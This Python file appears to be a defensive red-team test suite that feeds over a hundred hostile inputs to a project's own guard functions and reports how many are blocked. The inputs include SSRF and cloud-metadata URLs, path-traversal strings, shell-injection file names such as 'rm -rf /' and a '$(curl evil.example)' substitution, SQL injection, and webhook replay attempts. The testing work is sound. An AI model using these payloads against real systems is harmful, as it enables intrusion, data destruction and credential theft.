"""Adversarial Red-Team security suite firing >=100 real attack payloads across 5 categories."""

from __future__ import annotations

import math
import tempfile
import time
from pathlib import Path
from typing import Any

from kiberlabs_bench.guards import (
    ReplayGuard,
    sanitize_fts5_query,
    validate_outbound_url,
    validate_safe_path,
    validate_sku_payload,
)

SSRF_PAYLOADS: tuple[str, ...] = (
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.170.2/v2/credentials",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]/admin",
    "https://[::1]:8443/internal",
    "http://[::ffff:127.0.0.1]/secret",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://[fe80::1]/router",
    "http://[fc00::1]/metrics",
    "http://[fd12:3456:789a::1]/api",
    "http://10.0.0.1/internal",
    "http://10.255.255.254/health",
    "http://172.16.0.1/db",
    "http://172.31.255.254/admin",
    "http://192.168.1.1/setup",
    "http://100.64.0.1/cgnat",
    "http://0.0.0.0:8000/",
    "http://localhost:8080/debug",
    "http://127.0.0.1:6379/",
    "http://2130706433/decimal-loopback",
    "http://0x7f000001/hex-loopback",
    "http://0177.0.0.1/octal-loopback",
    "http://db.prod.internal:5432/",
    "http://public.example.com@127.0.0.1/smuggle",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
)

PATH_SHELL_PAYLOADS: tuple[str, ...] = (
    "../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e/%2e%2e/etc/shadow",
    "..%5c..%5cboot.ini",
    "%252e%252e%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "\\\\127.0.0.1\\c$\\secret.txt",
    "report.pdf\x00.txt",
    "export.csv; rm -rf /",
    "export.csv && whoami",
    "export.csv | cat /etc/passwd",
    "`id`.csv",
    "$(curl evil.example).json",
    "a/b/../../../../etc/hosts",
    "safe/../../../.env",
    "invoice\nrm -rf /tmp",
    "data.csv > /tmp/pwned",
    "data.csv < /etc/passwd",
    ".../...//etc/passwd",
    "//etc/passwd",
    "..",
)

FTS5_SQLI_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1",
    '"; DROP TABLE docs; --',
    "1 UNION SELECT sql FROM sqlite_master --",
    "title:secret OR body:*",
    "NEAR(gdpr breach, 100)",
    'a" OR ""="',
    "/* comment */ SELECT * FROM docs",
    "*",
    "^",
    "NOT compliance",
    "(gdpr) OR (invoice)",
    "{title body}: secret",
    "audit; ATTACH DATABASE '/tmp/pwn.db' AS pwn;--",
    "'; PRAGMA writable_schema=ON;--",
    '"unterminated quote',
    "invoice OR receipt AND tax",
    "doc_id:1",
    "1=1; DELETE FROM docs;",
    "\x00SELECT",
    '""',
    "   ",
    "---",
    "[ISO-9001] CNC-402 OR *",
    "[MAN-CNC402#sec-4.2] ; DROP TABLE manual_chunks;--",
    "manual_id:MAN-CNC402 NEAR/5 overheat",
    "[DIN-47100] NOT CNC-402",
    "CNC-402 AND 1=1",
    "\u202eTCELES * FROM manual_chunks",
    "spindle\u200b OR 1=1",
    "＇ OR ＇1＇=＇1",
    "ＳＥＬＥＣＴ * FROM manual_chunks_fts",
    "CNC-402 \u041eR E-404",
)


def _build_malformed_sku_payloads() -> list[tuple[str, Any]]:
    """Flow: construct 20 distinct malformed/out-of-bounds SKU payloads testing strict boundary guards."""
    valid = {
        "sku_id": "SKU-VALID-01",
        "supplier_price": 40.0,
        "resale_price": 95.0,
        "shipping_cost": 5.0,
        "fee_pct": 12.0,
        "delivery_days": 3,
        "rating": 4.7,
        "source_url": "https://supplier.example.com/item/1",
    }

    def mod(**kw: Any) -> dict[str, Any]:
        d = dict(valid)
        d.update(kw)
        return d

    return [
        ("nan_supplier_price", mod(supplier_price=math.nan)),
        ("pos_inf_resale", mod(resale_price=math.inf)),
        ("neg_inf_shipping", mod(shipping_cost=-math.inf)),
        ("negative_supplier_price", mod(supplier_price=-10.0)),
        ("zero_resale_price", mod(resale_price=0.0)),
        ("negative_shipping", mod(shipping_cost=-1.5)),
        ("fee_over_60", mod(fee_pct=75.0)),
        ("negative_fee", mod(fee_pct=-5.0)),
        ("rating_over_5", mod(rating=5.5)),
        ("negative_rating", mod(rating=-0.1)),
        ("delivery_zero", mod(delivery_days=0)),
        ("delivery_over_90", mod(delivery_days=365)),
        ("bool_as_price", mod(supplier_price=True)),
        ("bool_as_days", mod(delivery_days=False)),
        ("string_injection_price", mod(resale_price="95.0; DROP TABLE skus")),
        ("oversized_sku_id", mod(sku_id="A" * 1024)),
        ("control_char_sku_id", mod(sku_id="SKU\x00BAD")),
        ("missing_required_keys", {"sku_id": "SKU-ONLY"}),
        ("non_dict_none", None),
        ("non_dict_list", ["SKU-1", 40.0]),
    ]


def run_redteam_suite() -> dict[str, Any]:
    """Flow: execute >=100 adversarial payloads across 5 threat classes and verify 100% deterministic blocking."""
    categories: list[dict[str, Any]] = []
    suite_start = time.perf_counter_ns()

    # 1. SSRF
    t0 = time.perf_counter_ns()
    ssrf_blocked = 0
    for url in SSRF_PAYLOADS:
        try:
            validate_outbound_url(url)
        except ValueError:
            ssrf_blocked += 1
    categories.append(
        {
            "id": "ssrf",
            "name": "SSRF & Cloud Metadata",
            "total": len(SSRF_PAYLOADS),
            "blocked": ssrf_blocked,
            "bypassed": len(SSRF_PAYLOADS) - ssrf_blocked,
            "block_rate_pct": round((ssrf_blocked / len(SSRF_PAYLOADS)) * 100.0, 2),
            "duration_ms": round((time.perf_counter_ns() - t0) / 1e6, 3),
            "samples": list(SSRF_PAYLOADS[:4]),
        }
    )

    # 2. Path Traversal & Shell Injection
    t0 = time.perf_counter_ns()
    path_blocked = 0
    with tempfile.TemporaryDirectory(prefix="kl_rt_path_") as tmp:
        base = Path(tmp)
        for p in PATH_SHELL_PAYLOADS:
            try:
                validate_safe_path(base, p)
            except ValueError:
                path_blocked += 1
    categories.append(
        {
            "id": "path_shell",
            "name": "Path Traversal & Shell Injection",
            "total": len(PATH_SHELL_PAYLOADS),
            "blocked": path_blocked,
            "bypassed": len(PATH_SHELL_PAYLOADS) - path_blocked,
            "block_rate_pct": round((path_blocked / len(PATH_SHELL_PAYLOADS)) * 100.0, 2),
            "duration_ms": round((time.perf_counter_ns() - t0) / 1e6, 3),
            "samples": [repr(s) for s in PATH_SHELL_PAYLOADS[:4]],
        }
    )

    # 3. FTS5 & SQL Injection
    t0 = time.perf_counter_ns()
    fts_blocked = 0
    for q in FTS5_SQLI_PAYLOADS:
        try:
            sanitize_fts5_query(q)
        except ValueError:
            fts_blocked += 1
    categories.append(
        {
            "id": "fts5_sqli",
            "name": "FTS5 & SQL Injection",
            "total": len(FTS5_SQLI_PAYLOADS),
            "blocked": fts_blocked,
            "bypassed": len(FTS5_SQLI_PAYLOADS) - fts_blocked,
            "block_rate_pct": round((fts_blocked / len(FTS5_SQLI_PAYLOADS)) * 100.0, 2),
            "duration_ms": round((time.perf_counter_ns() - t0) / 1e6, 3),
            "samples": list(FTS5_SQLI_PAYLOADS[:4]),
        }
    )

    # 4. Webhook Replay & HMAC Auth Storms (21 adversarial attempts after 1 valid seed)
    t0 = time.perf_counter_ns()
    replay_total = 0
    replay_blocked = 0
    now = 1_763_800_000
    secret = b"kiberlabs-benchmark-webhook-secret"
    seed_body = b'{"event":"lead.created","id":"evt_seed_001"}'
    with tempfile.TemporaryDirectory(prefix="kl_rt_replay_") as tmp:
        guard = ReplayGuard(Path(tmp) / "replay.db", secret_key=secret)
        try:
            valid_sig = guard.sign(now, seed_body)
            assert guard.verify_and_record("evt_seed_001", now, seed_body, valid_sig, now=now)

            attacks: list[tuple[str, int, bytes, str]] = []
            # 8 duplicate event_id replay attempts (exact + body mutation)
            for idx in range(8):
                body = seed_body if idx < 5 else f'{{"event":"replay","n":{idx}}}'.encode()
                attacks.append(("evt_seed_001", now, body, guard.sign(now, body)))
            # 4 expired timestamps
            for idx, ts in enumerate((now - 301, now - 3600, now - 86400, 0)):
                attacks.append((f"evt_exp_{idx}", ts, seed_body, guard.sign(ts, seed_body)))
            # 3 future clock skew timestamps
            for idx, ts in enumerate((now + 61, now + 3600, now + 99999)):
                attacks.append((f"evt_fut_{idx}", ts, seed_body, guard.sign(ts, seed_body)))
            # 6 bad / tampered / missing signatures
            other_guard = ReplayGuard(":memory:", secret_key=b"wrong-secret")
            try:
                wrong_guard_sig = other_guard.sign(now, seed_body)
            finally:
                other_guard.close()
            attacks.extend(
                [
                    ("evt_sig_1", now, seed_body, ""),
                    ("evt_sig_2", now, seed_body, "md5=" + "a" * 64),
                    ("evt_sig_3", now, seed_body, "sha256=deadbeef"),
                    ("evt_sig_4", now, seed_body, "sha256=" + "z" * 64),
                    ("evt_sig_5", now, seed_body, wrong_guard_sig),
                    ("evt_sig_6", now, b'{"event":"tampered"}', valid_sig),
                ]
            )
            replay_total = len(attacks)
            for eid, ts, body, sig in attacks:
                try:
                    guard.verify_and_record(eid, ts, body, sig, now=now)
                except ValueError:
                    replay_blocked += 1
        finally:
            guard.close()

    categories.append(
        {
            "id": "webhook_replay",
            "name": "Webhook Replay & HMAC Storms",
            "total": replay_total,
            "blocked": replay_blocked,
            "bypassed": replay_total - replay_blocked,
            "block_rate_pct": round((replay_blocked / replay_total) * 100.0, 2),
            "duration_ms": round((time.perf_counter_ns() - t0) / 1e6, 3),
            "samples": [
                "duplicate event_id=evt_seed_001 (x8)",
                "expired timestamp (now - 301s)",
                "future skew (now + 3600s)",
                "tampered body with reused HMAC sig",
            ],
        }
    )

    # 5. Invalid / Malformed Inputs
    t0 = time.perf_counter_ns()
    malformed_cases = _build_malformed_sku_payloads()
    malformed_blocked = 0
    for _label, bad_payload in malformed_cases:
        try:
            validate_sku_payload(bad_payload)
        except ValueError:
            malformed_blocked += 1
    categories.append(
        {
            "id": "malformed_inputs",
            "name": "Invalid & Malformed Boundary Inputs",
            "total": len(malformed_cases),
            "blocked": malformed_blocked,
            "bypassed": len(malformed_cases) - malformed_blocked,
            "block_rate_pct": round((malformed_blocked / len(malformed_cases)) * 100.0, 2),
            "duration_ms": round((time.perf_counter_ns() - t0) / 1e6, 3),
            "samples": [label for label, _ in malformed_cases[:4]],
        }
    )

    total_payloads = sum(c["total"] for c in categories)
    blocked_count = sum(c["blocked"] for c in categories)
    bypassed_count = sum(c["bypassed"] for c in categories)
    return {
        "total_payloads": total_payloads,
        "blocked_count": blocked_count,
        "bypassed_count": bypassed_count,
        "block_rate_pct": round((blocked_count / total_payloads) * 100.0, 2),
        "duration_ms": round((time.perf_counter_ns() - suite_start) / 1e6, 3),
        "categories": categories,
    }
